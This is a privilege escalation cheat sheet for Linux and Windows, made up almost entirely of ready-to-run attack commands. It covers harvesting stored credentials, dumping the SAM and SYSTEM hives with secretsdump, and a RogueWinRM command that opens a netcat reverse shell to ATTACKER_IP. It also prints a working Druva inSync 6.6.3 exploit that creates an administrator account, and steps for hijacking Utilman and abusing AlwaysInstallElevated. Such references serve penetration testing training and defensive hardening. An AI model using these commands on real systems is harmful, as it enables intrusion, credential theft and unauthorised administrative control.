# Privilege Escalation Cheat Sheet

## 🔴 Linux Privilege Escalation
```bash
# Check for sudo privileges
sudo -l

# Find files with SUID permissions
find / -perm -4000 -type f 2>/dev/null

# Check kernel version
uname -a

# Find writable directories
find / -type d -writable 2>/dev/null

# Search for .bash_history
cat ~/.bash_history

🔵 Windows Privilege Escalation
powershell

# Check for system privileges
whoami /priv

# List installed programs
wmic product get name,version

# Look for misconfigurations
accesschk.exe -uwcqv "Everyone" *



    Harvesting Passwords from Usual Spots

Attackers can escalate privileges by finding stored credentials in various locations:

🔹 Windows Credential Manager:
cmdkey /list  # List stored credentials

🔹 Unattended Installations: Credentials may be stored in installation files:
type C:\Windows\Panther\Unattend.xml

🔹 Powershell History:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

🔹 Saved Windows Credentials:
runas /savecred /user:admin cmd.exe

    Abusing Service Misconfigurations

Attackers can manipulate service running as SYSTEM:

🔹 Check for writable service executables:
sc qc vulnerable_service
icacls C:\vulnerable_service.exe

If writable, replace the executable with a malicious payload and restart the service:
sc stop vulnerable_service
sc start vulnerable_service

    Abusing Dangerous Privileges

🔹 SeImpersonatePrivilege (RogueWinRM):
C:\tools\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

🔹 SeBackupPrivilege (Extracting SAM & SYSTEM Hives):
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

🔹 SeTakeOwnershipPrivilege (Taking control of critical files):
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant user:F

      Abusing Vulnerable Software

Outdated or misconfigured software can allow privilege escalation:


🔹 Check installed software:
wmic product get name,version,vendor

🔹 Druva inSync 6.6.3 Exploit (Executing SYSTEM commands):
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

      Quick Wins for Privilege Escalation

🔹 AlwaysInstallElevated:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

If enabled, an attacker can run a malicious MSI file:
msiexec /quiet /qn /i C:\malicious.msi

🔹 Weak File Permissions:
icacls C:\sensitive_file.txt  # Check file permissions

🔹 Unquoted Service Paths:
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"

       Tools of the Trade
Several tools automate privilege escalation discovery

🔹 WinPEAS (Privilege Escalation Automation)
winpeas.exe > outputfile.txt

🔹 PrivescCheck (PowerShell-based Enumeration)
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck

🔹 WES-NG (Windows Exploit Suggester)
wes.py systeminfo.txt

🔹 Metasploit Local Exploit Suggester
use post/multi/recon/local_exploit_suggester
